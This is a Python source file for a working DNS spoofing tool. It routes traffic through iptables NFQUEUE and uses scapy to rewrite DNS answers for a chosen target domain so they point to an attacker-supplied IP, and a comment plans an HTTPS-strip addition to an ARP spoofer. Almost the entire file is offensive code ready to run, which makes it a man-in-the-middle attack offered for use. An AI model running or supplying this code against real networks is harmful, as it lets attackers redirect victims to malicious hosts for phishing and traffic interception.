#  Copyright (c) 2019. - ciphyr
#  Email: ciphyr[at]protonmail.com
#
#  Licensed under the Apache License, Version 2.0 (the "License");
#  You may not use this file except in compliance with the License.
#  You may obtain a copy of the License at
#
#  http://www.apache.org/licenses/LICENSE-2.0
#
#  Unless required by applicable law or agreed to in writing, software
#  distributed under the License is distributed on an "AS IS" BASIS,
#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#  See the License for the specific language governing permissions and
#  limitations under the License.

import netfilterqueue
import scapy.all as scapy
import optparse
import subprocess


# Note: Python2 only due to netfilterqueue
# Future Improvements
# HTTPSstrip (in arp-spoofer)

def config_iptables():
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])


def flush_iptables():
    print("[-] Flushing IP tables")
    subprocess.call(["iptables", "--flush"])


def get_cmd_args():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_url", help="Name or URL keyword of target website")
    parser.add_option("-r", "--redirect", dest="redirect_ip", help="IP to redirect DNS requests to")
    (options, arguements) = parser.parse_args()

    if not options.target_url:
        parser.error("Use --help for usage info")

    if not options.redirect_ip:
        parser.error("Use --help for usage info")

    return options


def analyze_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if str(options.target_url) in qname:
            print("[+] Spoofing Target DNS")
            # Dont create new line
            answer = scapy.DNSRR(rrname=qname, rdata=options.redirect_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()


options = get_cmd_args()

print("[+] Configuring IP tables...")
config_iptables()
print("[+] DNS Spoofer Ready. Waiting for: " + options.target_url)

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, analyze_packet)
try:
    queue.run()
except KeyboardInterrupt:
    print("\n[-] Flushing/Restoring IP tables...")
    flush_iptables()
    print("[=] Complete. Program quiting...")
